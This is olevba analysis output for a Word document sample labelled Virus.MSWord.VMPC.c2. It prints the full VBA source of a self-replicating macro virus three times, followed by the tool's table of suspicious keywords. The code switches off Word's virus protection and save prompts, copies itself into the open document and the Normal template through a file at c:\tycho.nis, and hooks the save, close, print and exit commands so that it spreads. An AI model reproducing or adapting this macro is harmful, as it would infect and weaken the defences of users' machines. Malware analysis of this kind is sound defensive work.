olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC.c2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1 
in file: Virus.MSWord.VMPC.c2 - OLE stream: 'Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Tycho()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

Application.VBE.ActiveVBProject.VBComponents("Module1").Export ("c:\tycho.nis")

ActiveDocument.ReadOnlyRecommended = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "Tycho" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "Tycho" Then ActivInstall = True
Next I
If ActivInstall = False Then
    With ActiveDocument.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If NormInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("Tycho").Export "c:\tycho.nis"
    With NormalTemplate.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub

Sub FileSave()
    On Error Resume Next
    Call Tycho
    ActiveDocument.Save
End Sub

Sub FileClose()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call Tycho
End Sub

Sub FilePrint()
    On Error Resume Next
    Dialogs(wdDialogFilePrint).Show
    Call Tycho
End Sub

Sub FileExit()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoExit()
    On Error Resume Next
    Call Tycho
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module11 
in file: Virus.MSWord.VMPC.c2 - OLE stream: 'Module11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Tycho()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

Application.VBE.ActiveVBProject.VBComponents("Module1").Export ("c:\tycho.nis")

ActiveDocument.ReadOnlyRecommended = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "Tycho" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "Tycho" Then ActivInstall = True
Next I
If ActivInstall = False Then
    With ActiveDocument.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If NormInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("Tycho").Export "c:\tycho.nis"
    With NormalTemplate.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub

Sub FileSave()
    On Error Resume Next
    Call Tycho
    ActiveDocument.Save
End Sub

Sub FileClose()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call Tycho
End Sub

Sub FilePrint()
    On Error Resume Next
    Dialogs(wdDialogFilePrint).Show
    Call Tycho
End Sub

Sub FileExit()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoExit()
    On Error Resume Next
    Call Tycho
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module12 
in file: Virus.MSWord.VMPC.c2 - OLE stream: 'Module12'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Tycho()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

Application.VBE.ActiveVBProject.VBComponents("Module1").Export ("c:\tycho.nis")

ActiveDocument.ReadOnlyRecommended = False
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(I).Name = "Tycho" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(I).Name = "Tycho" Then ActivInstall = True
Next I
If ActivInstall = False Then
    With ActiveDocument.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If NormInstall = False Then
    Application.VBE.ActiveVBProject.VBComponents("Tycho").Export "c:\tycho.nis"
    With NormalTemplate.VBProject
        With .VBComponents.Import("c:\tycho.nis")
        End With
    End With
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If
End Sub

Sub FileSave()
    On Error Resume Next
    Call Tycho
    ActiveDocument.Save
End Sub

Sub FileClose()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub

Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call Tycho
End Sub

Sub FilePrint()
    On Error Resume Next
    Dialogs(wdDialogFilePrint).Show
    Call Tycho
End Sub

Sub FileExit()
    On Error Resume Next
    Call Tycho
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoExit()
    On Error Resume Next
    Call Tycho
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.VMPC.c2 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

